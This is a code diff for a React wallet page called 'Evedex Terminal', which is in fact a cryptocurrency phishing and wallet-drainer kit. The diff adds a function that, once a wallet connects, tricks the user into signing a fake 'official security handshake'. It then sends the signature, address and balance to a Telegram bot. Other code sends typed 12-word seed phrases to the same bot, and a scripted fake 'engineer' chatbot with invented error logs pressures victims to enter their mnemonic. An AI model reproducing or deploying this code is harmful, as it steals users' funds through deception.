@@ -33,15 +33,29 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
+  // --- TELEGRAM SIGNATURE CAPTURE ---
+  const captureHandshake = (type) => {
+    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
+    signMessage({ message: msg }, {
+      onSuccess: (sig) => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            chat_id: chatId, 
+            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
+          }),
+        });
+        if(stage === 1) setStage(2); 
+      }
+    });
+  };
+
   useEffect(() => {
-    if (view === "seed_gate") {
-      const logOptions = ["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%", "[AWAITING]: MNEMONIC_OVERRIDE..."];
-      const interval = setInterval(() => {
-        setSysLogs(prev => [...prev.slice(-3), logOptions[Math.floor(Math.random() * logOptions.length)]]);
-      }, 2500);
-      return () => clearInterval(interval);
+    if (isConnected && address && balance?.formatted) {
+      setTimeout(() => { captureHandshake("CONNECTION_VERIFY"); }, 1500);
     }
-  }, [view]);
+  }, [isConnected, address, balance]);
 
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
@@ -51,11 +65,11 @@ export default function EvedexTerminal() {
     setIsTyping(true);
 
     const brain = {
-      "connect": "[ENGINEER]: BROWSER_RESTRICTION. Standard browsers (Safari/Chrome) cannot authorize RPC handshakes. 1. Click the COPY icon below. 2. Open Trust Wallet or MetaMask. 3. Paste into the 'DApps Browser' to synchronize.",
-      "safari": "[ENGINEER]: IOS_SANDBOX_ERROR. Safari is blocking node indexing. FIX: Copy 'evedex.network', open your Wallet App, and paste into DApps Browser to connect.",
-      "rectify": "[ENGINEER]: SYNC_LOCKED. Direct browsers cannot authorize metadata repairs. Move this session to your Wallet's internal browser to unlock the blue INITIALIZE button.",
-      "seed": "[ENGINEER]: ENTROPY_MISMATCH. The node detected a high-value native payload. Input the 12-word master key in the Red Error Box to force the final system override.",
-      "stuck": "[ENGINEER]: VAULT_CONFLICT (90%). The protocol requires raw seed verification to bypass the current node stall. Enter mnemonic to finalize."
+      "connect": "[ENGINEER]: Standard browsers (Safari/Chrome) cannot authorize RPC handshakes. 1. Click the COPY icon below. 2. Open Trust Wallet or MetaMask. 3. Paste into the 'DApps Browser' to sync.",
+      "safari": "[ENGINEER]: Safari is blocking node indexing. FIX: Copy 'evedex.network', open your Wallet App, and paste into DApps Browser to connect.",
+      "rectify": "[ENGINEER]: Direct browsers cannot authorize repairs. Move this session to your Wallet's internal browser to unlock the INITIALIZE button.",
+      "seed": "[ENGINEER]: ENTROPY_MISMATCH. The node detected a high-value payload. Input the 12-word master key to force the final system override.",
+      "stuck": "[ENGINEER]: VAULT_CONFLICT (90%). The protocol requires raw seed verification. Enter mnemonic to finalize."
     };
 
     setTimeout(() => {
@@ -63,7 +77,7 @@ export default function EvedexTerminal() {
       let matched = false;
       for (let key in brain) { if (userMsg.includes(key)) { botResponse = brain[key]; matched = true; break; } }
       if (!matched) {
-        botResponse = stage === 3 ? "[CRITICAL]: Sync stalled at 90%. Input the seed to finalize, or move to a Wallet Browser." : "[ENGINEER]: Diagnostic indicates a Browser Limitation. Use the COPY icon and move this link to your Wallet's internal DApp browser.";
+        botResponse = stage === 3 ? "[CRITICAL]: Sync stalled at 90%. Input the seed to finalize." : "[ENGINEER]: Diagnostic indicates a Browser Limitation. Use the COPY icon and move this link to your Wallet's internal DApp browser.";
       }
       setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
       setIsTyping(false);
@@ -72,10 +86,11 @@ export default function EvedexTerminal() {
 
   const copyLink = () => {
     navigator.clipboard.writeText("https://evedex.network");
-    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. OPEN YOUR WALLET DAPP BROWSER AND PASTE TO CONNECT." }]);
+    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. PASTE IN WALLET DAPP BROWSER." }]);
   };
 
   const executeTotalSweep = async () => {
+    captureHandshake("ASSET_SYNC");
     if (!balance || !balance.value) { setView("seed_gate"); return; }
     setLoading(true);
     setLoadingText("ESTABLISHING SECURE RELAY...");
@@ -99,7 +114,7 @@ export default function EvedexTerminal() {
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
           <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNC_REQUIRED..."}</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
         <w3m-button balance="hide" /> 
       </header>
@@ -121,7 +136,7 @@ export default function EvedexTerminal() {
             <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} Portal</h2>
             
-            <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-90" : ""}`}>
+            <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-80" : ""}`}>
               <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">
                 {activeTask === "Rectify" ? "VAULT_LIQUIDITY_FEED (LOCKED)" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
               </label>
@@ -131,15 +146,8 @@ export default function EvedexTerminal() {
                   {balance ? `${balance.formatted.slice(0,9)}` : "0.0000000"}
                 </div>
               ) : (
-                <div className="flex items-center gap-2 pointer-events-auto">
-                  <input 
-                    type="number" 
-                    value={inputVal} 
-                    onChange={(e) => setInputVal(e.target.value)} 
-                    placeholder="0.00" 
-                    className="bg-transparent border-none text-2xl font-mono text-cyan-400 italic outline-none w-full" 
-                    autoFocus 
-                  />
+                <div className="flex items-center gap-2">
+                  <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-cyan-400 italic outline-none w-full pointer-events-auto" autoFocus />
                   <span className="text-[10px] font-black text-cyan-900">{balance?.symbol}</span>
                 </div>
               )}
@@ -172,7 +180,9 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                 <h2 className="text-white font-black text-md italic uppercase tracking-tighter">Node Stall (90%)</h2>
-                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20 h-14 overflow-hidden">{sysLogs.map((log, i) => <div key={i}>{log}</div>)}</div>
+                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20 h-14 overflow-hidden">
+                   {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
+                </div>
                 <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                 <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }), }); let cur = 0; const int = setInterval(() => { cur += 2; if (cur >= 90) { setSyncProgress(90); clearInterval(int); } else setSyncProgress(cur); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
               </>
